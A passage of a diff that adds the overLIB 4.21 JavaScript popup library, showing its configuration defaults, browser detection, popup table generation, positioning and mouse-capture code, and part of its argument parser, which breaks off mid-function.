@@ -1,0 +1,1495 @@
+//\/////
+//\  overLIB 4.21 - You may not remove or change this notice.
+//\  Copyright Erik Bosrup 1998-2004. All rights reserved.
+//\
+//\  Contributors are listed on the homepage.
+//\  This file might be old, always check for the latest version at:
+//\  http://www.bosrup.com/web/overlib/
+//\
+//\  Please read the license agreement (available through the link above)
+//\  before using overLIB. Direct any licensing questions to erik@bosrup.com.
+//\
+//\  Do not sell this as your own work or remove this copyright notice. 
+//\  For full details on copying or changing this script please read the
+//\  license agreement at the link above. Please give credit on sites that
+//\  use overLIB and submit changes of the script so other people can use
+//\  them as well.
+//   $Revision: 1.1 $                $Date: 2007/08/08 09:42:12 $
+//\/////
+//\mini
+
+////////
+// PRE-INIT
+// Ignore these lines, configuration is below.
+////////
+var olLoaded = 0;var pmStart = 10000000; var pmUpper = 10001000; var pmCount = pmStart+1; var pmt=''; var pms = new Array(); var olInfo = new Info('4.21', 1);
+var FREPLACE = 0; var FBEFORE = 1; var FAFTER = 2; var FALTERNATE = 3; var FCHAIN=4;
+var olHideForm=0;  // parameter for hiding SELECT and ActiveX elements in IE5.5+ 
+var olHautoFlag = 0;  // flags for over-riding VAUTO and HAUTO if corresponding
+var olVautoFlag = 0;  // positioning commands are used on the command line
+var hookPts = new Array(), postParse = new Array(), cmdLine = new Array(), runTime = new Array();
+// for plugins
+registerCommands('donothing,inarray,caparray,sticky,background,noclose,caption,left,right,center,offsetx,offsety,fgcolor,bgcolor,textcolor,capcolor,closecolor,width,border,cellpad,status,autostatus,autostatuscap,height,closetext,snapx,snapy,fixx,fixy,relx,rely,fgbackground,bgbackground,padx,pady,fullhtml,above,below,capicon,textfont,captionfont,closefont,textsize,captionsize,closesize,timeout,function,delay,hauto,vauto,closeclick,wrap,followmouse,mouseoff,closetitle,cssoff,compatmode,cssclass,fgclass,bgclass,textfontclass,captionfontclass,closefontclass');
+
+////////
+// DEFAULT CONFIGURATION
+// Settings you want everywhere are set here. All of this can also be
+// changed on your html page or through an overLIB call.
+////////
+if (typeof ol_fgcolor=='undefined') var ol_fgcolor="#CCCCFF";
+if (typeof ol_bgcolor=='undefined') var ol_bgcolor="#333399";
+if (typeof ol_textcolor=='undefined') var ol_textcolor="#000000";
+if (typeof ol_capcolor=='undefined') var ol_capcolor="#FFFFFF";
+if (typeof ol_closecolor=='undefined') var ol_closecolor="#9999FF";
+if (typeof ol_textfont=='undefined') var ol_textfont="Verdana,Arial,Helvetica";
+if (typeof ol_captionfont=='undefined') var ol_captionfont="Verdana,Arial,Helvetica";
+if (typeof ol_closefont=='undefined') var ol_closefont="Verdana,Arial,Helvetica";
+if (typeof ol_textsize=='undefined') var ol_textsize="1";
+if (typeof ol_captionsize=='undefined') var ol_captionsize="1";
+if (typeof ol_closesize=='undefined') var ol_closesize="1";
+if (typeof ol_width=='undefined') var ol_width="200";
+if (typeof ol_border=='undefined') var ol_border="1";
+if (typeof ol_cellpad=='undefined') var ol_cellpad=2;
+if (typeof ol_offsetx=='undefined') var ol_offsetx=10;
+if (typeof ol_offsety=='undefined') var ol_offsety=10;
+if (typeof ol_text=='undefined') var ol_text="Default Text";
+if (typeof ol_cap=='undefined') var ol_cap="";
+if (typeof ol_sticky=='undefined') var ol_sticky=0;
+if (typeof ol_background=='undefined') var ol_background="";
+if (typeof ol_close=='undefined') var ol_close="Close";
+if (typeof ol_hpos=='undefined') var ol_hpos=RIGHT;
+if (typeof ol_status=='undefined') var ol_status="";
+if (typeof ol_autostatus=='undefined') var ol_autostatus=0;
+if (typeof ol_height=='undefined') var ol_height=-1;
+if (typeof ol_snapx=='undefined') var ol_snapx=0;
+if (typeof ol_snapy=='undefined') var ol_snapy=0;
+if (typeof ol_fixx=='undefined') var ol_fixx=-1;
+if (typeof ol_fixy=='undefined') var ol_fixy=-1;
+if (typeof ol_relx=='undefined') var ol_relx=null;
+if (typeof ol_rely=='undefined') var ol_rely=null;
+if (typeof ol_fgbackground=='undefined') var ol_fgbackground="";
+if (typeof ol_bgbackground=='undefined') var ol_bgbackground="";
+if (typeof ol_padxl=='undefined') var ol_padxl=1;
+if (typeof ol_padxr=='undefined') var ol_padxr=1;
+if (typeof ol_padyt=='undefined') var ol_padyt=1;
+if (typeof ol_padyb=='undefined') var ol_padyb=1;
+if (typeof ol_fullhtml=='undefined') var ol_fullhtml=0;
+if (typeof ol_vpos=='undefined') var ol_vpos=BELOW;
+if (typeof ol_aboveheight=='undefined') var ol_aboveheight=0;
+if (typeof ol_capicon=='undefined') var ol_capicon="";
+if (typeof ol_frame=='undefined') var ol_frame=self;
+if (typeof ol_timeout=='undefined') var ol_timeout=0;
+if (typeof ol_function=='undefined') var ol_function=null;
+if (typeof ol_delay=='undefined') var ol_delay=0;
+if (typeof ol_hauto=='undefined') var ol_hauto=0;
+if (typeof ol_vauto=='undefined') var ol_vauto=0;
+if (typeof ol_closeclick=='undefined') var ol_closeclick=0;
+if (typeof ol_wrap=='undefined') var ol_wrap=0;
+if (typeof ol_followmouse=='undefined') var ol_followmouse=1;
+if (typeof ol_mouseoff=='undefined') var ol_mouseoff=0;
+if (typeof ol_closetitle=='undefined') var ol_closetitle='Close';
+if (typeof ol_compatmode=='undefined') var ol_compatmode=0;
+if (typeof ol_css=='undefined') var ol_css=CSSOFF;
+if (typeof ol_fgclass=='undefined') var ol_fgclass="";
+if (typeof ol_bgclass=='undefined') var ol_bgclass="";
+if (typeof ol_textfontclass=='undefined') var ol_textfontclass="";
+if (typeof ol_captionfontclass=='undefined') var ol_captionfontclass="";
+if (typeof ol_closefontclass=='undefined') var ol_closefontclass="";
+
+////////
+// ARRAY CONFIGURATION
+////////
+
+// You can use these arrays to store popup text here instead of in the html.
+if (typeof ol_texts=='undefined') var ol_texts = new Array("Text 0", "Text 1");
+if (typeof ol_caps=='undefined') var ol_caps = new Array("Caption 0", "Caption 1");
+
+////////
+// END OF CONFIGURATION
+// Don't change anything below this line, all configuration is above.
+////////
+
+
+
+
+
+////////
+// INIT
+////////
+// Runtime variables init. Don't change for config!
+var o3_text="";
+var o3_cap="";
+var o3_sticky=0;
+var o3_background="";
+var o3_close="Close";
+var o3_hpos=RIGHT;
+var o3_offsetx=2;
+var o3_offsety=2;
+var o3_fgcolor="";
+var o3_bgcolor="";
+var o3_textcolor="";
+var o3_capcolor="";
+var o3_closecolor="";
+var o3_width=100;
+var o3_border=1;
+var o3_cellpad=2;
+var o3_status="";
+var o3_autostatus=0;
+var o3_height=-1;
+var o3_snapx=0;
+var o3_snapy=0;
+var o3_fixx=-1;
+var o3_fixy=-1;
+var o3_relx=null;
+var o3_rely=null;
+var o3_fgbackground="";
+var o3_bgbackground="";
+var o3_padxl=0;
+var o3_padxr=0;
+var o3_padyt=0;
+var o3_padyb=0;
+var o3_fullhtml=0;
+var o3_vpos=BELOW;
+var o3_aboveheight=0;
+var o3_capicon="";
+var o3_textfont="Verdana,Arial,Helvetica";
+var o3_captionfont="Verdana,Arial,Helvetica";
+var o3_closefont="Verdana,Arial,Helvetica";
+var o3_textsize="1";
+var o3_captionsize="1";
+var o3_closesize="1";
+var o3_frame=self;
+var o3_timeout=0;
+var o3_timerid=0;
+var o3_allowmove=0;
+var o3_function=null; 
+var o3_delay=0;
+var o3_delayid=0;
+var o3_hauto=0;
+var o3_vauto=0;
+var o3_closeclick=0;
+var o3_wrap=0;
+var o3_followmouse=1;
+var o3_mouseoff=0;
+var o3_closetitle='';
+var o3_compatmode=0;
+var o3_css=CSSOFF;
+var o3_fgclass="";
+var o3_bgclass="";
+var o3_textfontclass="";
+var o3_captionfontclass="";
+var o3_closefontclass="";
+
+// Display state variables
+var o3_x = 0;
+var o3_y = 0;
+var o3_showingsticky = 0;
+var o3_removecounter = 0;
+
+// Our layer
+var over = null;
+var fnRef, hoveringSwitch = false;
+var olHideDelay;
+
+// Decide browser version
+var isMac = (navigator.userAgent.indexOf("Mac") != -1);
+var olOp = (navigator.userAgent.toLowerCase().indexOf('opera') > -1 && document.createTextNode);  // Opera 7
+var olNs4 = (navigator.appName=='Netscape' && parseInt(navigator.appVersion) == 4);
+var olNs6 = (document.getElementById) ? true : false;
+var olKq = (olNs6 && /konqueror/i.test(navigator.userAgent));
+var olIe4 = (document.all) ? true : false;
+var olIe5 = false; 
+var olIe55 = false; // Added additional variable to identify IE5.5+
+var docRoot = 'document.body';
+
+// Resize fix for NS4.x to keep track of layer
+if (olNs4) {
+	var oW = window.innerWidth;
+	var oH = window.innerHeight;
+	window.onresize = function() { if (oW != window.innerWidth || oH != window.innerHeight) location.reload(); }
+}
+
+// Microsoft Stupidity Check(tm).
+if (olIe4) {
+	var agent = navigator.userAgent;
+	if (/MSIE/.test(agent)) {
+		var versNum = parseFloat(agent.match(/MSIE[ ](\d\.\d+)\.*/i)[1]);
+		if (versNum >= 5){
+			olIe5=true;
+			olIe55=(versNum>=5.5&&!olOp) ? true : false;
+			if (olNs6) olNs6=false;
+		}
+	}
+	if (olNs6) olIe4 = false;
+}
+
+// Check for compatability mode.
+if (document.compatMode && document.compatMode == 'CSS1Compat') {
+	docRoot= ((olIe4 && !olOp) ? 'document.documentElement' : docRoot);
+}
+
+// Add window onload handlers to indicate when all modules have been loaded
+// For Netscape 6+ and Mozilla, uses addEventListener method on the window object
+// For IE it uses the attachEvent method of the window object and for Netscape 4.x
+// it sets the window.onload handler to the OLonload_handler function for Bubbling
+if(window.addEventListener) window.addEventListener("load",OLonLoad_handler,false);
+else if (window.attachEvent) window.attachEvent("onload",OLonLoad_handler);
+
+var capExtent;
+
+////////
+// PUBLIC FUNCTIONS
+////////
+
+// overlib(arg0,...,argN)
+// Loads parameters into global runtime variables.
+function overlib() {
+	if (!olLoaded || isExclusive(overlib.arguments)) return true;
+	if (olCheckMouseCapture) olMouseCapture();
+	if (over) {
+		over = (typeof over.id != 'string') ? o3_frame.document.all['overDiv'] : over;
+		cClick();
+	}
+
+	// Load defaults to runtime.
+  olHideDelay=0;
+	o3_text=ol_text;
+	o3_cap=ol_cap;
+	o3_sticky=ol_sticky;
+	o3_background=ol_background;
+	o3_close=ol_close;
+	o3_hpos=ol_hpos;
+	o3_offsetx=ol_offsetx;
+	o3_offsety=ol_offsety;
+	o3_fgcolor=ol_fgcolor;
+	o3_bgcolor=ol_bgcolor;
+	o3_textcolor=ol_textcolor;
+	o3_capcolor=ol_capcolor;
+	o3_closecolor=ol_closecolor;
+	o3_width=ol_width;
+	o3_border=ol_border;
+	o3_cellpad=ol_cellpad;
+	o3_status=ol_status;
+	o3_autostatus=ol_autostatus;
+	o3_height=ol_height;
+	o3_snapx=ol_snapx;
+	o3_snapy=ol_snapy;
+	o3_fixx=ol_fixx;
+	o3_fixy=ol_fixy;
+	o3_relx=ol_relx;
+	o3_rely=ol_rely;
+	o3_fgbackground=ol_fgbackground;
+	o3_bgbackground=ol_bgbackground;
+	o3_padxl=ol_padxl;
+	o3_padxr=ol_padxr;
+	o3_padyt=ol_padyt;
+	o3_padyb=ol_padyb;
+	o3_fullhtml=ol_fullhtml;
+	o3_vpos=ol_vpos;
+	o3_aboveheight=ol_aboveheight;
+	o3_capicon=ol_capicon;
+	o3_textfont=ol_textfont;
+	o3_captionfont=ol_captionfont;
+	o3_closefont=ol_closefont;
+	o3_textsize=ol_textsize;
+	o3_captionsize=ol_captionsize;
+	o3_closesize=ol_closesize;
+	o3_timeout=ol_timeout;
+	o3_function=ol_function;
+	o3_delay=ol_delay;
+	o3_hauto=ol_hauto;
+	o3_vauto=ol_vauto;
+	o3_closeclick=ol_closeclick;
+	o3_wrap=ol_wrap;	
+	o3_followmouse=ol_followmouse;
+	o3_mouseoff=ol_mouseoff;
+	o3_closetitle=ol_closetitle;
+	o3_css=ol_css;
+	o3_compatmode=ol_compatmode;
+	o3_fgclass=ol_fgclass;
+	o3_bgclass=ol_bgclass;
+	o3_textfontclass=ol_textfontclass;
+	o3_captionfontclass=ol_captionfontclass;
+	o3_closefontclass=ol_closefontclass;
+	
+	setRunTimeVariables();
+	
+	fnRef = '';
+	
+	// Special for frame support, over must be reset...
+	o3_frame = ol_frame;
+	
+	if(!(over=createDivContainer())) return false;
+
+	parseTokens('o3_', overlib.arguments);
+	if (!postParseChecks()) return false;
+
+	if (o3_delay == 0) {
+		return runHook("olMain", FREPLACE);
+ 	} else {
+		o3_delayid = setTimeout("runHook('olMain', FREPLACE)", o3_delay);
+		return false;
+	}
+}
+
+// Clears popups if appropriate
+function nd(time) {
+	if (olLoaded && !isExclusive()) {
+		hideDelay(time);  // delay popup close if time specified
+
+		if (o3_removecounter >= 1) { o3_showingsticky = 0 };
+		
+		if (o3_showingsticky == 0) {
+			o3_allowmove = 0;
+			if (over != null && o3_timerid == 0) runHook("hideObject", FREPLACE, over);
+		} else {
+			o3_removecounter++;
+		}
+	}
+	
+	return true;
+}
+
+// The Close onMouseOver function for stickies
+function cClick() {
+	if (olLoaded) {
+		runHook("hideObject", FREPLACE, over);
+		o3_showingsticky = 0;	
+	}	
+	return false;
+}
+
+// Method for setting page specific defaults.
+function overlib_pagedefaults() {
+	parseTokens('ol_', overlib_pagedefaults.arguments);
+}
+
+
+////////
+// OVERLIB MAIN FUNCTION
+////////
+
+// This function decides what it is we want to display and how we want it done.
+function olMain() {
+	var layerhtml, styleType;
+ 	runHook("olMain", FBEFORE);
+ 	
+	if (o3_background!="" || o3_fullhtml) {
+		// Use background instead of box.
+		layerhtml = runHook('ol_content_background', FALTERNATE, o3_css, o3_text, o3_background, o3_fullhtml);
+	} else {
+		// They want a popup box.
+		styleType = (pms[o3_css-1-pmStart] == "cssoff" || pms[o3_css-1-pmStart] == "cssclass");
+
+		// Prepare popup background
+		if (o3_fgbackground != "") o3_fgbackground = "background=\""+o3_fgbackground+"\"";
+		if (o3_bgbackground != "") o3_bgbackground = (styleType ? "background=\""+o3_bgbackground+"\"" : o3_bgbackground);
+
+		// Prepare popup colors
+		if (o3_fgcolor != "") o3_fgcolor = (styleType ? "bgcolor=\""+o3_fgcolor+"\"" : o3_fgcolor);
+		if (o3_bgcolor != "") o3_bgcolor = (styleType ? "bgcolor=\""+o3_bgcolor+"\"" : o3_bgcolor);
+
+		// Prepare popup height
+		if (o3_height > 0) o3_height = (styleType ? "height=\""+o3_height+"\"" : o3_height);
+		else o3_height = "";
+
+		// Decide which kinda box.
+		if (o3_cap=="") {
+			// Plain
+			layerhtml = runHook('ol_content_simple', FALTERNATE, o3_css, o3_text);
+		} else {
+			// With caption
+			if (o3_sticky) {
+				// Show close text
+				layerhtml = runHook('ol_content_caption', FALTERNATE, o3_css, o3_text, o3_cap, o3_close);
+			} else {
+				// No close text
+				layerhtml = runHook('ol_content_caption', FALTERNATE, o3_css, o3_text, o3_cap, "");
+			}
+		}
+	}	
+
+	// We want it to stick!
+	if (o3_sticky) {
+		if (o3_timerid > 0) {
+			clearTimeout(o3_timerid);
+			o3_timerid = 0;
+		}
+		o3_showingsticky = 1;
+		o3_removecounter = 0;
+	}
+
+	// Created a separate routine to generate the popup to make it easier
+	// to implement a plugin capability
+	if (!runHook("createPopup", FREPLACE, layerhtml)) return false;
+
+	// Prepare status bar
+	if (o3_autostatus > 0) {
+		o3_status = o3_text;
+		if (o3_autostatus > 1) o3_status = o3_cap;
+	}
+
+	// When placing the layer the first time, even stickies may be moved.
+	o3_allowmove = 0;
+
+	// Initiate a timer for timeout
+	if (o3_timeout > 0) {          
+		if (o3_timerid > 0) clearTimeout(o3_timerid);
+		o3_timerid = setTimeout("cClick()", o3_timeout);
+	}
+
+	// Show layer
+	runHook("disp", FREPLACE, o3_status);
+	runHook("olMain", FAFTER);
+
+	return (olOp && event && event.type == 'mouseover' && !o3_status) ? '' : (o3_status != '');
+}
+
+////////
+// LAYER GENERATION FUNCTIONS
+////////
+// These functions just handle popup content with tags that should adhere to the W3C standards specification.
+
+// Makes simple table without caption
+function ol_content_simple(text) {
+	var cpIsMultiple = /,/.test(o3_cellpad);
+	var txt = '<table width="'+o3_width+ '" border="0" cellpadding="'+o3_border+'" cellspacing="0" '+(o3_bgclass ? 'class="'+o3_bgclass+'"' : o3_bgcolor+' '+o3_height)+'><tr><td><table width="100%" border="0" '+((olNs4||!cpIsMultiple) ? 'cellpadding="'+o3_cellpad+'" ' : '')+'cellspacing="0" '+(o3_fgclass ? 'class="'+o3_fgclass+'"' : o3_fgcolor+' '+o3_fgbackground+' '+o3_height)+'><tr><td valign="TOP"'+(o3_textfontclass ? ' class="'+o3_textfontclass+'">' : ((!olNs4&&cpIsMultiple) ? ' style="'+setCellPadStr(o3_cellpad)+'">' : '>'))+(o3_textfontclass ? '' : wrapStr(0,o3_textsize,'text'))+text+(o3_textfontclass ? '' : wrapStr(1,o3_textsize))+'</td></tr></table></td></tr></table>';
+
+	set_background("");
+	return txt;
+}
+
+// Makes table with caption and optional close link
+function ol_content_caption(text,title,close) {
+	var nameId, txt, cpIsMultiple = /,/.test(o3_cellpad);
+	var closing, closeevent;
+
+	closing = "";
+	closeevent = "onmouseover";
+	if (o3_closeclick == 1) closeevent = (o3_closetitle ? "title='" + o3_closetitle +"'" : "") + " onclick";
+	if (o3_capicon != "") {
+	  nameId = ' hspace = \"5\"'+' align = \"middle\" alt = \"\"';
+	  if (typeof o3_dragimg != 'undefined' && o3_dragimg) nameId =' hspace=\"5\"'+' name=\"'+o3_dragimg+'\" id=\"'+o3_dragimg+'\" align=\"middle\" alt=\"Drag Enabled\" title=\"Drag Enabled\"';
+	  o3_capicon = '<img src=\"'+o3_capicon+'\"'+nameId+' />';
+	}
+
+	if (close != "")
+		closing = '<td '+(!o3_compatmode && o3_closefontclass ? 'class="'+o3_closefontclass : 'align="RIGHT')+'"><a href="javascript:return '+fnRef+'cClick();"'+((o3_compatmode && o3_closefontclass) ? ' class="' + o3_closefontclass + '" ' : ' ')+closeevent+'="return '+fnRef+'cClick();">'+(o3_closefontclass ? '' : wrapStr(0,o3_closesize,'close'))+close+(o3_closefontclass ? '' : wrapStr(1,o3_closesize,'close'))+'</a></td>';
+	txt = '<table width="'+o3_width+ '" border="0" cellpadding="'+o3_border+'" cellspacing="0" '+(o3_bgclass ? 'class="'+o3_bgclass+'"' : o3_bgcolor+' '+o3_bgbackground+' '+o3_height)+'><tr><td><table width="100%" border="0" cellpadding="2" cellspacing="0"><tr><td'+(o3_captionfontclass ? ' class="'+o3_captionfontclass+'">' : '>')+(o3_captionfontclass ? '' : '<b>'+wrapStr(0,o3_captionsize,'caption'))+o3_capicon+title+(o3_captionfontclass ? '' : wrapStr(1,o3_captionsize)+'</b>')+'</td>'+closing+'</tr></table><table width="100%" border="0" '+((olNs4||!cpIsMultiple) ? 'cellpadding="'+o3_cellpad+'" ' : '')+'cellspacing="0" '+(o3_fgclass ? 'class="'+o3_fgclass+'"' : o3_fgcolor+' '+o3_fgbackground+' '+o3_height)+'><tr><td valign="TOP"'+(o3_textfontclass ? ' class="'+o3_textfontclass+'">' :((!olNs4&&cpIsMultiple) ? ' style="'+setCellPadStr(o3_cellpad)+'">' : '>'))+(o3_textfontclass ? '' : wrapStr(0,o3_textsize,'text'))+text+(o3_textfontclass ? '' : wrapStr(1,o3_textsize)) + '</td></tr></table></td></tr></table>';
+
+	set_background("");
+	return txt;
+}
+
+// Sets the background picture,padding and lots more. :)
+function ol_content_background(text,picture,hasfullhtml) {
+	if (hasfullhtml) {
+		txt=text;
+	} else {
+		txt='<table width="'+o3_width+'" border="0" cellpadding="0" cellspacing="0" height="'+o3_height+'"><tr><td colspan="3" height="'+o3_padyt+'"></td></tr><tr><td width="'+o3_padxl+'"></td><td valign="TOP" width="'+(o3_width-o3_padxl-o3_padxr)+(o3_textfontclass ? '" class="'+o3_textfontclass : '')+'">'+(o3_textfontclass ? '' : wrapStr(0,o3_textsize,'text'))+text+(o3_textfontclass ? '' : wrapStr(1,o3_textsize))+'</td><td width="'+o3_padxr+'"></td></tr><tr><td colspan="3" height="'+o3_padyb+'"></td></tr></table>';
+	}
+
+	set_background(picture);
+	return txt;
+}
+
+// Loads a picture into the div.
+function set_background(pic) {
+	if (pic == "") {
+		if (olNs4) {
+			over.background.src = null; 
+		} else if (over.style) {
+			over.style.backgroundImage = "none";
+		}
+	} else {
+		if (olNs4) {
+			over.background.src = pic;
+		} else if (over.style) {
+			over.style.width=o3_width + 'px';
+			over.style.backgroundImage = "url("+pic+")";
+		}
+	}
+}
+
+////////
+// HANDLING FUNCTIONS
+////////
+var olShowId=-1;
+
+// Displays the popup
+function disp(statustext) {
+	runHook("disp", FBEFORE);
+	
+	if (o3_allowmove == 0) {
+		runHook("placeLayer", FREPLACE);
+		(olNs6&&olShowId<0) ? olShowId=setTimeout("runHook('showObject', FREPLACE, over)", 1) : runHook("showObject", FREPLACE, over);
+		o3_allowmove = (o3_sticky || o3_followmouse==0) ? 0 : 1;
+	}
+	
+	runHook("disp", FAFTER);
+
+	if (statustext != "") self.status = statustext;
+}
+
+// Creates the actual popup structure
+function createPopup(lyrContent){
+	runHook("createPopup", FBEFORE);
+	
+	if (o3_wrap) {
+		var wd,ww,theObj = (olNs4 ? over : over.style);
+		theObj.top = theObj.left = ((olIe4&&!olOp) ? 0 : -10000) + (!olNs4 ? 'px' : 0);
+		layerWrite(lyrContent);
+		wd = (olNs4 ? over.clip.width : over.offsetWidth);
+		if (wd > (ww=windowWidth())) {
+			lyrContent=lyrContent.replace(/\&nbsp;/g, ' ');
+			o3_width=ww;
+			o3_wrap=0;
+		} 
+	}
+
+	layerWrite(lyrContent);
+	
+	// Have to set o3_width for placeLayer() routine if o3_wrap is turned on
+	if (o3_wrap) o3_width=(olNs4 ? over.clip.width : over.offsetWidth);
+	
+	runHook("createPopup", FAFTER, lyrContent);
+
+	return true;
+}
+
+// Decides where we want the popup.
+function placeLayer() {
+	var placeX, placeY, widthFix = 0;
+	
+	// HORIZONTAL PLACEMENT, re-arranged to work in Safari
+	if (o3_frame.innerWidth) widthFix=18; 
+	iwidth = windowWidth();
+
+	// Horizontal scroll offset
+	winoffset=(olIe4) ? eval('o3_frame.'+docRoot+'.scrollLeft') : o3_frame.pageXOffset;
+
+	placeX = runHook('horizontalPlacement',FCHAIN,iwidth,winoffset,widthFix);
+
+	// VERTICAL PLACEMENT, re-arranged to work in Safari
+	if (o3_frame.innerHeight) {
+		iheight=o3_frame.innerHeight;
+	} else if (eval('o3_frame.'+docRoot)&&eval("typeof o3_frame."+docRoot+".clientHeight=='number'")&&eval('o3_frame.'+docRoot+'.clientHeight')) { 
+		iheight=eval('o3_frame.'+docRoot+'.clientHeight');
+	}			
+
+	// Vertical scroll offset
+	scrolloffset=(olIe4) ? eval('o3_frame.'+docRoot+'.scrollTop') : o3_frame.pageYOffset;
+	placeY = runHook('verticalPlacement',FCHAIN,iheight,scrolloffset);
+
+	// Actually move the object.
+	repositionTo(over, placeX, placeY);
+}
+
+// Moves the layer
+function olMouseMove(e) {
+	var e = (e) ? e : event;
+
+	if (e.pageX) {
+		o3_x = e.pageX;
+		o3_y = e.pageY;
+	} else if (e.clientX) {
+		o3_x = eval('e.clientX+o3_frame.'+docRoot+'.scrollLeft');
+		o3_y = eval('e.clientY+o3_frame.'+docRoot+'.scrollTop');
+	}
+	
+	if (o3_allowmove == 1) runHook("placeLayer", FREPLACE);
+
+	// MouseOut handler
+	if (hoveringSwitch && !olNs4 && runHook("cursorOff", FREPLACE)) {
+		(olHideDelay ? hideDelay(olHideDelay) : cClick());
+		hoveringSwitch = !hoveringSwitch;
+	}
+}
+
+// Fake function for 3.0 users.
+function no_overlib() { return ver3fix; }
+
+// Capture the mouse and chain other scripts.
+function olMouseCapture() {
+	capExtent = document;
+	var fN, str = '', l, k, f, wMv, sS, mseHandler = olMouseMove;
+	var re = /function[ ]*(\w*)\(/;
+	
+	wMv = (!olIe4 && window.onmousemove);
+	if (document.onmousemove || wMv) {
+		if (wMv) capExtent = window;
+		f = capExtent.onmousemove.toString();
+		fN = f.match(re);
+		if (fN == null) {
+			str = f+'(e); ';
+		} else if (fN[1] == 'anonymous' || fN[1] == 'olMouseMove' || (wMv && fN[1] == 'onmousemove')) {
+			if (!olOp && wMv) {
+				l = f.indexOf('{')+1;
+				k = f.lastIndexOf('}');
+				sS = f.substring(l,k);
+				if ((l = sS.indexOf('(')) != -1) {
+					sS = sS.substring(0,l).replace(/^\s+/,'').replace(/\s+$/,'');
+					if (eval("typeof " + sS + " == 'undefined'")) window.onmousemove = null;
+					else str = sS + '(e);';
+				}
+			}
+			if (!str) {
+				olCheckMouseCapture = false;
+				return;
+			}
+		} else {
+			if (fN[1]) str = fN[1]+'(e); ';
+			else {
+				l = f.indexOf('{')+1;
+				k = f.lastIndexOf('}');
+				str = f.substring(l,k) + '\n';
+			}
+		}
+		str += 'olMouseMove(e); ';
+		mseHandler = new Function('e', str);
+	}
+
+	capExtent.onmousemove = mseHandler;
+	if (olNs4) capExtent.captureEvents(Event.MOUSEMOVE);
+}
+
+////////
+// PARSING FUNCTIONS
+////////
+
+// Does the actual command parsing.
+function parseTokens(pf, ar) {
+	// What the next argument is expected to be.
+	var v, i, mode=-1, par = (pf != 'ol_');	
+	var fnMark = (par && !ar.length ? 1 : 0);
+
+	for (i = 0; i < ar.length; i++) {
+		if (mode < 0) {
+			// Arg is maintext,unless its a number between pmStart and pmUpper
+			// then its a command.
+			if (typeof ar[i] == 'number' && ar[i] > pmStart && ar[i] < pmUpper) {
+				fnMark = (par ? 1 : 0);
+				i--;   // backup one so that the next block can parse it
+			} else {
+				switch(pf) {
+					case 'ol_':
+						ol_text = ar[i].toString();
+						break;
+					default:
+						o3_text=ar[i].toString();  
+				}
+			}
+			mode = 0;
+		} else {
+			// Note: NS4 doesn't like switch cases with vars.
+			if (ar[i] >= pmCount || ar[i]==DONOTHING) { continue; }
+			if (ar[i]==INARRAY) { fnMark = 0; eval(pf+'text=ol_texts['+ar[++i]+'].toString()'); continue; }
+			if (ar[i]==CAPARRAY) { eval(pf+'cap=ol_caps['+ar[++i]+'].toString()'); continue; }
+			if (ar[i]==STICKY) { if (pf!='ol_') eval(pf+'sticky=1'); continue; }
+			if (ar[i]==BACKGROUND) { eval(pf+'background="'+ar[++i]+'"'); continue; }
+			if (ar[i]==NOCLOSE) { if (pf!='ol_') opt_NOCLOSE(); continue; }
+			if (ar[i]==CAPTION) { eval(pf+"cap='"+escSglQuote(ar[++i])+"'"); continue; }
+			if (ar[i]==CENTER || ar[i]==LEFT || ar[i]==RIGHT) { eval(pf+'hpos='+ar[i]); if(pf!='ol_') olHautoFlag=1; continue; }
+			if (ar[i]==OFFSETX) { eval(pf+'offsetx='+ar[++i]); continue; }
+			if (ar[i]==OFFSETY) { eval(pf+'offsety='+ar[++i]); continue; }
+			if (ar[i]==FGCOLOR) { eval(pf+'fgcolor="'+ar[++i]+'"'); continue; }
+			if (ar[i]==BGCOLOR) { eval(pf+'bgcolor="'+ar[++i]+'"'); continue; }
+			if (ar[i]==TEXTCOLOR) { eval(pf+'textcolor="'+ar[++i]+'"'); continue; }
+			if (ar[i]==CAPCOLOR) { eval(pf+'capcolor="'+ar[++i]+'"'); continue; }
+			if (ar[i]==CLOSECOLOR) { eval(pf+'closecolor="'+ar[++i]+'"'); continue; }
+			if (ar[i]==WIDTH) { eval(pf+'width='+ar[++i]); continue; }
+			if (ar[i]==BORDER) { eval(pf+'border='+ar[++i]); continue; }
+			if (ar[i]==CELLPAD) { i=opt_MULTIPLEARGS(++i,ar,(pf+'cellpad')); continue; }
+			if (ar[i]==STATUS) { eval(pf+"status='"+escSglQuote(ar[++i])+"'"); continue; }
+			if (ar[i]==AUTOSTATUS) { eval(pf +'autostatus=('+pf+'autostatus == 1) ? 0 : 1'); continue; }
+			if (ar[i]==AUTOSTATUSCAP) { eval(pf +'autostatus=('+pf+'autostatus == 2) ? 0 : 2'); continue; }
+			if (ar[i]==HEIGHT) { eval(pf+'height='+pf+'aboveheight='+ar[++i]); continue; } // Same param again.
+			if (ar[i]==CLOSETEXT) { eval(pf+"close='"+escSglQuote(ar[++i])+"'"); continue; }
+			if (ar[i]==SNAPX) { eval(pf+'snapx='+ar[++i]); continue; }
+			if (ar[i]==SNAPY) { eval(pf+'snapy='+ar[++i]); continue; }
+			if (ar[i]==FIXX) { eval(pf+'fixx='+ar[++i]); continue; }
+			if (ar[i]==FIXY) { eval(pf+'fixy='+ar[++i]); continue; }
+			if (ar[i]==RELX) { eval(pf+'relx='+ar[++i]); continue; }
+			if (ar[i]==RELY) { eval(pf+'rely='+ar[++i]); continue; }
+			if (ar[i]==FGBACKGROUND) { eval(pf+'fgbackground="'+ar[++i]+'"'); continue; }
+			if (ar[i]==BGBACKGROUND) { eval(pf+'bgbackground="'+ar[++i]+'"'); continue; }
+			if (ar[i]==PADX) { eval(pf+'padxl='+ar[++i]); eval(pf+'padxr='+ar[++i]); continue; }
+			if (ar[i]==PADY) { eval(pf+'padyt='+ar[++i]); eval(pf+'padyb='+ar[++i]); continue; }
+			if (ar[i]==FULLHTML) { if (pf!='ol_') eval(pf+'fullhtml=1'); continue; }
+			if (ar[i]==BELOW || ar[i]==ABOVE) { eval(pf+'vpos='+ar[i]); if (pf!='ol_') olVautoFlag=1; continue; }
+			if (ar[i]==CAPICON) { eval(pf+'capicon="'+ar[++i]+'"'); continue; }
+			if (ar[i]==TEXTFONT) { eval(pf+"textfont='"+escSglQuote(ar[++i])+"'"); continue; }
+			if (ar[i]==CAPTIONFONT) { eval(pf+"captionfont='"+escSglQuote(ar[++i])+"'"); continue; }
+			if (ar[i]==CLOSEFONT) { eval(pf+"closefont='"+escSglQuote(ar[++i])+"'"); continue; }
+			if (ar[i]==TEXTSIZE) { eval(pf+'textsize="'+ar[++i]+'"'); continue; }
